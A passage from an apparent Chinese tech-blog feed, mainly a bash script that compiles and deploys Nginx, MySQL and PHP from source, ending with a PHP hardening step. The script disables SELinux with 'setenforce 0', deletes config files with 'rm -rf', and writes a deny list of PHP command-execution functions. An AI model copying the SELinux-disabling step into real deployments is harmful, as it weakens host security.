&lt;p&gt;出现的次数。&lt;br&gt;&lt;a href=&quot;https://www.baidu.com/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.baidu.com/index.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.jaking.com/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jaking.com/index.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.sina.com.cn/1024.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.sina.com.cn/1024.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.jaking.com/2048.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jaking.com/2048.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.sina.com.cn/4096.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.sina.com.cn/4096.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.jaking.com/8192.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jaking.com/8192.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;参考答案:&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LNMP手动部署</title>
    <link href="https://marnm.github.io//posts/5922577d/"/>
    <id>https://marnm.github.io//posts/5922577d/</id>
    <published>2022-06-07T04:52:09.000Z</published>
    <updated>2022-09-02T19:18:18.892Z</updated>
    
    <content type="html"><![CDATA[<pre><code class="bash">#!/bin/bash#Explain: This is a script to quickly deploy the LNMP service#Author: echo#Email: fnaichu@qq.com#Date: 2019-06-06#&#x6CE8;&#x610F;: &#x8FD0;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x524D;&#xFF0C;&#x8BF7;&#x914D;&#x7F6E;&#x597D;yum&#x6E90;&#xFF0C;&#x628A;&#x6240;&#x9700;&#x6E90;&#x7801;&#x5305;&#x653E;&#x5230;/usr/local/src&#x76EE;&#x5F55;&#x4E0B;&#x3002;#&#x63A8;&#x8350;&#x5B89;&#x88C5;&#x5305;&#xFF1A;#cmake-2.8.11.2.tar.gz   libmcrypt-2.5.8.tar.gz  yasm-1.2.0.tar.gz    libpng-1.6.12.tar.gz    #freetype-2.5.3.tar.gz   libvpx-v1.3.0.tar.bz2   php-5.5.14.tar.gz    jpegsrc.v9a.tar.gz      #mysql-5.6.19.tar.gz     t1lib-5.1.2.tar.gz      libgd-2.1.0.tar.gz   nginx-1.6.0.tar.gz      tiff-4.0.3.tar.gz#&#x90E8;&#x7F72;Linux#&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x5305;yum install -y apr* autoconf automake bison bzip2 bzip2* compat* cpp curl curl-devel fontconfig fontconfig-devel freetype freetype* freetype-devel gcc gcc-c++ gd gettext gettext-devel glibc kernel kernel-headers keyutils keyutils-libs-devel krb5-devel libcom_err-devel libpng libpng-devel libjpeg* libsepol-devel libselinux-devel libstdc++-devel libtool* libgomp libxml2 libxml2-devel libXpm* libtiff libtiff* make mpfr ncurses* ntp openssl openssl-devel patch pcre-devel perl php-common php-gd policycoreutils telnet t1lib t1lib* nasm nasm* unzip wget zlib-devel#&#x5B89;&#x88C5;CMake&#x7F16;&#x8BD1;&#x5DE5;&#x5177;cd /usr/local/srctar xzvf cmake-2.8.11.2.tar.gzcd cmake-2.8.11.2./configuremake &amp;&amp; make install#&#x90E8;&#x7F72;Nginx#&#x505C;&#x6389;Apache&#x670D;&#x52A1;systemctl  stop httpd#&#x5B89;&#x88C5;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x5E93;&#x6587;&#x4EF6;yum install -y  gcc*  zlib  zlib-devel   pcre pcre-devel  openssl  openssl-devel#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6267;&#x884C;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8D26;&#x6237;useradd nginx -s /sbin/nologin#&#x5B89;&#x88C5;nginx&#x6E90;&#x7801;&#x5305;cd /usr/local/srctar xzvf nginx-1.6.0.tar.gzcd nginx-1.6.0./configure  --user=nginx  --group=nginx  --prefix=/usr/local/nginx  --with-http_stub_status_module   --with-http_sub_module   --with-http_ssl_module  --with-pcremake &amp;&amp; make install#&#x8BBE;&#x7F6E;selinuxsetenforce 0#&#x914D;&#x7F6E;&#x9632;&#x706B;&#x5899;/sbin/iptables -I INPUT -p tcp --dport 80 -j ACCEPTiptables-save &gt; /etc/sysconfig/iptables#&#x9A8C;&#x8BC1;nginx&#x662F;&#x5426;&#x914D;&#x7F6E;&#x6709;&#x8BEF;/usr/local/nginx/sbin/nginx -t#&#x542F;&#x52A8;nginx/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf#&#x67E5;&#x770B;nginx&#x8FDB;&#x7A0B;ps -ef|grep nginx#&#x90E8;&#x7F72;MySQL#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql&#x7684;&#x7528;&#x6237;useradd mysql -s /sbin/nologin#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x628A;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4;&#x8EAB;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;mysql&#x3002;mkdir -p /usr/local/mysql/varchown -Rf mysql:mysql /usr/local/mysql#&#x89E3;&#x538B;&#x3001;&#x7F16;&#x8BD1;&#x3001;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x5728;&#x7F16;&#x8BD1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x662F;cmake&#x547D;&#x4EE4;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;-DCMAKE_INSTALL_PREFIX&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;-DMYSQL_DATADIR&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;-DSYSCONFDIR&#x5219;&#x662F;&#x5B9A;&#x4E49;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x3002;cd /usr/local/srctar xzvf mysql-5.6.19.tar.gzcd mysql-5.6.19cmake . -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/usr/local/mysql/var -DSYSCONFDIR=/etcmake &amp;&amp; make install#&#x4E3A;&#x4E86;&#x8BA9;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#x8D77;&#x6765;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664;/etc&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;scripts&#x5185;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql_install_db&#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5E76;&#x4F7F;&#x7528;--user&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7684;&#x5BF9;&#x5E94;&#x8D26;&#x53F7;&#x540D;&#x79F0;&#xFF08;&#x5728;&#x524D;&#x9762;&#x6B65;&#x9AA4;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;--basedir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528;--datadir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x53EF;&#x751F;&#x6210;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x751F;&#x6210;&#x51FA;&#x65B0;&#x7684;MySQL&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;rm -rf /etc/my.cnfcd /usr/local/mysql./scripts/mysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/var#&#x628A;&#x7CFB;&#x7EDF;&#x65B0;&#x751F;&#x6210;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x5230;/etc&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x901A;&#x8FC7;service&#x547D;&#x4EE4;&#x6765;&#x7BA1;&#x7406;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x628A;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4FEE;&#x6539;&#x6210;755&#x4EE5;&#x4FBF;&#x4E8E;&#x8BA9;&#x7528;&#x6237;&#x6709;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x6743;&#x9650;&#x3002;ln -s my.cnf /etc/my.cnf cp ./support-files/mysql.server /etc/rc.d/init.d/mysqldchmod 755 /etc/rc.d/init.d/mysqld#&#x7F16;&#x8F91;&#x521A;&#x521A;&#x590D;&#x5236;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;46&#x3001;47&#x884C;&#x7684;basedir&#x4E0E;datadir&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x548C;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;sed -i &apos;46d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;45 abasedir=/usr/local/mysql&apos; /etc/rc.d/init.d/mysqld sed -i &apos;47d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;46 adatadir=/usr/local/mysql/var&apos; /etc/rc.d/init.d/mysqld#&#x542F;&#x52A8;MySQL,&#x628A;mysqld&#x52A0;&#x5165;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;service mysqld startchkconfig mysqld on#&#x8BBE;&#x7F6E;PATH&#x53D8;&#x91CF;sed -i &apos;74d&apos; /etc/profile &amp;&amp; sed -i &apos;73 aexport PATH=$PATH:/usr/local/mysql/bin&apos; /etc/profilesource /etc/profile#&#x521B;&#x5EFA;MySQL&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x76EE;&#x5F55;mkdir /var/lib/mysql#&#x94FE;&#x63A5;&#x6587;&#x4EF6;ln -s /usr/local/mysql/lib/mysql /usr/lib/mysqlln -s /tmp/mysql.sock /var/lib/mysql/mysql.sockln -s /usr/local/mysql/include/mysql /usr/include/mysql#&#x90E8;&#x7F72;PHP#&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x6E90;&#x7801;&#x5305;cd /usr/local/srctar zxvf yasm-1.2.0.tar.gzcd yasm-1.2.0./configuremake &amp;&amp; make installcd /usr/local/srctar zxvf libmcrypt-2.5.8.tar.gzcd libmcrypt-2.5.8./configuremake &amp;&amp; make installcd /usr/local/srctar xjvf libvpx-v1.3.0.tar.bz2cd libvpx-v1.3.0./configure --prefix=/usr/local/libvpx --enable-shared --enable-vp9make &amp;&amp; make installcd /usr/local/srctar zxvf tiff-4.0.3.tar.gzcd tiff-4.0.3./configure --prefix=/usr/local/tiff --enable-sharedmake &amp;&amp; make installcd /usr/local/srctar zxvf libpng-1.6.12.tar.gzcd libpng-1.6.12./configure --prefix=/usr/local/libpng --enable-sharedmake &amp;&amp; make installcd /usr/local/srctar zxvf freetype-2.5.3.tar.gzcd freetype-2.5.3./configure --prefix=/usr/local/freetype --enable-sharedmake &amp;&amp; make installcd /usr/local/srctar zxvf jpegsrc.v9a.tar.gzcd jpeg-9a./configure --prefix=/usr/local/jpeg --enable-sharedmake &amp;&amp; make installcd /usr/local/srctar zxvf libgd-2.1.0.tar.gzcd libgd-2.1.0./configure --prefix=/usr/local/libgd --enable-shared --with-jpeg=/usr/local/jpeg --with-png=/usr/local/libpng --with-freetype=/usr/local/freetype --with-fontconfig=/usr/local/freetype --with-xpm=/usr/ --with-tiff=/usr/local/tiff --with-vpx=/usr/local/libvpxmake &amp;&amp; make installcd /usr/local/srctar zxvf t1lib-5.1.2.tar.gzcd t1lib-5.1.2./configure --prefix=/usr/local/t1lib --enable-sharedmake without_doc &amp;&amp; make installln -s /usr/lib64/libltdl.so /usr/lib/libltdl.socp -frp /usr/lib64/libXpm.so* /usr/lib/#&#x6B64;&#x65F6;&#x7EC8;&#x4E8E;&#x628A;&#x7F16;&#x8BD1;php&#x670D;&#x52A1;&#x6E90;&#x7801;&#x5305;&#x7684;&#x76F8;&#x5173;&#x8F6F;&#x4EF6;&#x5305;&#x90FD;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x59A5;&#x5F53;&#x4E86;&#x3002;&#x5728;&#x5F00;&#x59CB;&#x7F16;&#x8BD1;php&#x6E90;&#x7801;&#x5305;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;LD_LIBRARY_PATH&#x7684;&#x5168;&#x5C40;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF0C;&#x8BE5;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x5E2E;&#x52A9;&#x7CFB;&#x7EDF;&#x627E;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x662F;&#x7F16;&#x8BD1;php&#x670D;&#x52A1;&#x6E90;&#x7801;&#x5305;&#x7684;&#x5FC5;&#x987B;&#x5143;&#x7D20;&#x4E4B;&#x4E00;&#x3002;&#x7F16;&#x8BD1;php&#x670D;&#x52A1;&#x6E90;&#x7801;&#x5305;&#x65F6;&#xFF0C;&#x9664;&#x4E86;&#x5B9A;&#x4E49;&#x8981;&#x5B89;&#x88C5;&#x5230;&#x7684;&#x76EE;&#x5F55;&#x4EE5;&#x5916;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x4F9D;&#x6B21;&#x5B9A;&#x4E49;&#x914D;&#x7F6E;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x3001;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x3001;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x76EE;&#x5F55;&#xFF0C;&#x4EE5;&#x53CA;libpng&#x3001;jpeg&#x3001;freetype&#x3001;libvpx&#x3001;zlib&#x3001;t1lib&#x7B49;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x88C5;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x53C2;&#x6570;&#x542F;&#x52A8;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8BF8;&#x591A;&#x9ED8;&#x8BA4;&#x529F;&#x80FD;&#x3002;cd /usr/local/srctar -zvxf php-5.5.14.tar.gzcd php-5.5.14export LD_LIBRARY_PATH=/usr/local/libgd/lib./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --with-mysql=/usr/local/mysql --with-mysqli=/usr/local/mysql/bin/mysql_config --with-mysql-sock=/tmp/mysql.sock --with-pdo-mysql=/usr/local/mysql --with-gd --with-png-dir=/usr/local/libpng --with-jpeg-dir=/usr/local/jpeg --with-freetype-dir=/usr/local/freetype --with-xpm-dir=/usr/ --with-vpx-dir=/usr/local/libvpx/ --with-zlib-dir=/usr/local/zlib --with-t1lib=/usr/local/t1lib --with-iconv --enable-libxml --enable-xml --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --enable-opcache --enable-mbregex --enable-fpm --enable-mbstring --enable-ftp --enable-gd-native-ttf --with-openssl --enable-pcntl --enable-sockets --with-xmlrpc --enable-zip --enable-soap --without-pear --with-gettext --enable-session --with-mcrypt --with-curl --enable-ctypemake &amp;&amp; make install#&#x5728;php&#x6E90;&#x7801;&#x5305;&#x7A0B;&#x5E8F;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5220;&#x9664;&#x5F53;&#x524D;&#x9ED8;&#x8BA4;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5C06;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x76F8;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x8FC7;&#x6765;&#x3002;rm -rf /etc/php.iniln -s /usr/local/php/etc/php.ini /etc/php.inicp php.ini-production /usr/local/php/etc/php.inicp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.confln -s /usr/local/php/etc/php-fpm.conf /etc/php-fpm.conf#php-fpm.conf&#x662F;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x91CD;&#x8981;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E4B;&#x4E00;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x542F;&#x7528;&#x8BE5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7B2C;25&#x884C;&#x7684;pid&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x5206;&#x522B;&#x5C06;&#x7B2C;148&#x548C;149&#x884C;&#x7684;user&#x4E0E;group&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;nginx&#x8D26;&#x6237;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x540D;&#x79F0;&#x3002;sed -i &apos;25d&apos; /usr/local/php/etc/php-fpm.conf &amp;&amp; sed -i &apos;24 apid = run/php-fpm.pid&apos; /usr/local/php/etc/php-fpm.conf sed -i &apos;148d&apos; /usr/local/php/etc/php-fpm.conf &amp;&amp; sed -i &apos;147 auser = nginx&apos; /usr/local/php/etc/php-fpm.confsed -i &apos;149d&apos; /usr/local/php/etc/php-fpm.conf &amp;&amp; sed -i &apos;148 agroup = nginx&apos; /usr/local/php/etc/php-fpm.conf#&#x914D;&#x7F6E;&#x59A5;&#x5F53;&#x540E;&#x4FBF;&#x53EF;&#x628A;&#x7528;&#x4E8E;&#x7BA1;&#x7406;php&#x670D;&#x52A1;&#x7684;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x4E2D;&#x4E86;&#x3002;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x8BF7;&#x8BB0;&#x5F97;&#x4E3A;&#x811A;&#x672C;&#x8D4B;&#x4E88;755&#x6743;&#x9650;&#xFF0C;&#x6700;&#x540E;&#x628A;php-fpm&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x52A0;&#x5165;&#x5230;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;cp /usr/local/src/php-5.5.14/sapi/fpm/init.d.php-fpm /etc/rc.d/init.d/php-fpmchmod 755 /etc/rc.d/init.d/php-fpmchkconfig php-fpm on#&#x7981;&#x7528;&#x9AD8;&#x5371;&#x529F;&#x80FD;sed -i &apos;305d&apos; /usr/local/php/etc/php.ini &amp;&amp; sed -i &apos;304 adisable_functions = passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restor e,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,escapeshellcmd,dll,popen,disk_free_space,checkdnsrr,checkdnsrr,g etservbyname,getservbyport,disk_total_space,posix_ctermid,posix_get_last_error,posix_getcwd,posix_getegid,posix_geteuid,posix_getgid,po six_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_getpwnam,posix_ getpwuid,posix_getrlimit,posix_getsid,posix_getuid,posix_isatty,posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,posix_ setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&apos; /usr/local/php/etc/php.ini#&#x8FD9;&#x6837;&#x5C31;&#x628A;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x59A5;&#x5F53;&#x4E86;&#x3002;&#x6700;&#x540E;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x7F16;&#x8F91;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;2&#x884C;&#x7684;&#x4E95;&#x53F7;&#xFF08;#&#xFF09;&#x5220;&#x9664;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x540E;&#x9762;&#x5199;&#x4E0A;&#x8D1F;&#x8D23;&#x8FD0;&#x884C;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8D26;&#x6237;&#x540D;&#x79F0;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x540D;&#x79F0;&#xFF1B;&#x5728;&#x7B2C;45&#x884C;&#x7684;index&#x53C2;&#x6570;&#x540E;&#x9762;&#x5199;&#x4E0A;&#x7F51;&#x7AD9;&#x7684;&#x9996;&#x9875;&#x540D;&#x79F0;&#x3002;&#x6700;&#x540E;&#x662F;&#x5C06;&#x7B2C;65&#xFF5E;71&#x884C;&#x53C2;&#x6570;&#x524D;&#x7684;&#x4E95;&#x53F7;&#xFF08;#&#xFF09;&#x5220;&#x9664;&#x6765;&#x542F;&#x7528;&#x53C2;&#x6570;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4FEE;&#x6539;&#x7B2C;69&#x884C;&#x7684;&#x811A;&#x672C;&#x540D;&#x79F0;&#x8DEF;&#x5F84;&#x53C2;&#x6570;&#xFF0C;&#x5176;&#x4E2D;$document_root&#x53D8;&#x91CF;&#x5373;&#x4E3A;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#x5B58;&#x50A8;&#x7684;&#x6839;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;&#xFF0C;&#x82E5;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x8BE5;&#x53D8;&#x91CF;&#xFF0C;&#x5219;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x65E0;&#x6CD5;&#x627E;&#x5230;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#xFF0C;&#x56E0;&#x6B64;&#x4F1A;&#x63D0;&#x793A;&#x201C;404&#x9875;&#x9762;&#x672A;&#x627E;&#x5230;&#x201D;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x3002;&#x5728;&#x786E;&#x8BA4;&#x53C2;&#x6570;&#x4FE1;&#x606F;&#x586B;&#x5199;&#x6B63;&#x786E;&#x540E;&#x4FBF;&#x53EF;&#x91CD;&#x542F;Nginx&#x670D;&#x52A1;&#x4E0E;php-fpm&#x670D;&#x52A1;&#x3002;sed -i &apos;2d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;1 auser nginx nginx;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;45d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;44 aindex index.html index.htm index.php;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;65d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;64 alocation ~ \.php$ {&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;66d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;65 aroot html;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;67d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;66 afastcgi_pass 127.0.0.1:9000;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;68d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;67 afastcgi_index index.php;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;69d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;68 afastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;&apos; /usr/local/nginx/conf/nginx.confsed -i &apos;70d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;69 ainclude fastcgi_params;&apos; /usr/local/nginx/conf/nginx.conf sed -i &apos;71d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;70 a}&apos; /usr/local/nginx/conf/nginx.conf#&#x91CD;&#x65B0;&#x52A0;&#x8F7D;nginx&#xFF0C;&#x91CD;&#x542F;php-fpm/usr/local/nginx/sbin/nginx -s reloadsystemctl restart php-fpmecho &quot;&#x606D;&#x559C;&#xFF01;LNMP&#x52A8;&#x6001;&#x7F51;&#x7AD9;&#x73AF;&#x5883;&#x67B6;&#x6784;&#x7684;&#x914D;&#x7F6E;&#x5DF2;&#x5B8C;&#x6210;&#xFF01;&quot;echo &quot;MySQL&#x5DF2;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x5B8C;&#x6210;MySQL&#x6570;&#x636E;&#x5E93;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF01;&quot;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;#!/bin/bash
#Explain: This is a script to quickly deploy the LNMP service
#Author: echo
#Email: fnaichu@qq.com
#Date
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Shell编程</title>
    <link href="https://marnm.github.io//posts/6309c3f8/"/>
    <id>https://marnm.github.io//posts/6309c3f8/</id>
    <published>2022-06-07T04:50:59.000Z</published>
    <updated>2022-06-07T04:56:53.682Z</updated>
    
